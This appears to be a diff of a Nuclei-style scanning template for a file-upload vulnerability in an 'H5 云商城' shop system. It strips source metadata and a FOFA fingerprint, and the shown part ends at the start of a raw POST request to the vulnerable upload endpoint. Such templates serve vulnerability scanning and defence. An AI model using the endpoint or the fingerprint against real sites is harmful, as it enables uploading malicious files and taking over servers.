@@ -3,14 +3,8 @@ info:
   name: H5 云商城 file.php 文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sxhwlgyqfr9cvqre
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: sxhwlgyqfr9cvqre
-    fofa: body="/public/qbsp.php"
 http:
 - raw:
   - 'POST /admin/commodtiy/file.php?upload=1 HTTP/1.1
